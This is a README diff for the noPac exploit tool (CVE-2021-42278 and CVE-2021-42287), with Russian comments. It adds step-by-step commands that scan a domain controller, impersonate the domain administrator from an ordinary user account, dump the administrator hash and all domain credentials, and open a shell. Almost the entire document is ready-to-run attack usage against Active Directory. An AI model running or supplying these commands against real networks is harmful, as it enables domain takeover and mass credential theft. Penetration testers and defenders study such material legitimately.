@@ -1,4 +1,14 @@
-
+```
+    #https://github.com/L34Rn/noPac-1
+    #Сканирует на уязвимости, там где меньше Ticket size там уязвимо
+    $ python3 scanner.py domain.local/username:'Password' -dc-ip 10.10.10.10
+    # дампим хеш администратора через эту уязвимость
+    $ python3 noPac.py domain.local/username:'Password' -dc-ip 10.10.10.10 -dc-host dc01 --impersonate administrator -dump -just-dc-user domain.local/Administrator
+    # дампим все креды [-use-ldap опциональный параметр]
+    $ python3 noPac.py domain.local/username:'Password' -dc-ip 10.10.10.10 -dc-host dc01 --impersonate administrator -dump [-use-ldap]
+    # получаем шел [-use-ldap опциональный параметр]
+    $ python3 noPac.py domain.local/username:'Password' -dc-ip 10.10.10.10 -dc-host dc01 --impersonate administrator -shell [-use-ldap]
+```
 ## About
 
 Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user 
